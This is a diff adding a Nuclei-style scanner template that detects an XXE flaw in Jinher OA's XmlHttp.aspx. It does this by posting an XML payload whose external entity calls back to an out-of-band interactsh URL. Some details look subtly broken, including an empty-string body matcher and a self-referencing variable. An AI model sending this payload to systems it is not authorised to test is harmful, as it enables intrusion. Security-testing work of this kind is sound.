@@ -1,0 +1,47 @@
+id: poc-yaml-jinher-xmlhttp-xxe
+
+info:
+  name: 金和OA XmlHttp.aspx XXE漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,xxe
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-login-page
+    method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "JHSoft"
+
+  - id: send-xml-payload
+    method: POST
+    path:
+      - "{{BaseURL}}/c6/Jhsoft.Web.addmenu/LoginTemplate/XmlHttp.aspx/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://{{interactsh-url}}"> %remote;]>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+    stop-at-first-match: true
+
+variables:
+  interactsh-url: "{{interactsh-url}}"
